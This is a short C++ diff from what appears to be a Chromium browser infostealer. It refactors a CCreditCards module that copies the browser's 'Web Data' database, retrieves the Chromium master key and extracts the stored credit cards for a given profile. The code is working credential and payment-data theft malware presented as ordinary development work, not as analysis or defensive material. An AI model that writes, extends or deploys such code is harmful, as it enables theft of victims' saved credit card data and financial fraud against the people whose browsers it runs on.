@@ -5,18 +5,13 @@
 #include "CCreditCards.h"
 
 void CCreditCards::execute(const fs::path &root, const std::string &name, const fs::path &path) {
-    std::vector<BYTE> master_key = ChromiumUtil::getMasterKey(path);
-
-    if(master_key.empty())
-        return;
-
-    fs::path orig_db_path = path / "Default" / "Web Data";
+    fs::path orig_db_path = path / this->getProfile() / "Web Data";
     fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);
 
     if(!exists(copied_db))
         return;
 
-    std::list<CreditCard> history = CCreditCards::getCreditCards(copied_db, master_key);
+    std::list<CreditCard> history = CCreditCards::getCreditCards(copied_db, this->getMasterKey());
 
     fs::remove(copied_db);
 
